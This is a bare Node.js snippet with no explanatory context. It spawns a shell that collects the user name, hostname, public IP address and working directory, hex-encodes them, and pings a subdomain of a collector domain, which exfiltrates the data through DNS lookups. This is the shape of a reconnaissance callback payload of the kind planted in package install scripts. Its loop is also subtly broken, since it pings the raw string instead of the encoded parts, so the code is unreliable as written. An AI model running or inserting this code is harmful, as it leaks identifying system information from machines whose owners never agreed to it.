const { exec } = require("child_process");

exec("a=$(whoami)-$(hostname)-$(curl -s ifconfig.me)$(pwd) && echo $a | xxd -p | while read part; do ping $a.collector.example.net; done", (error) => {
  if (error) console.error(error.message);
});
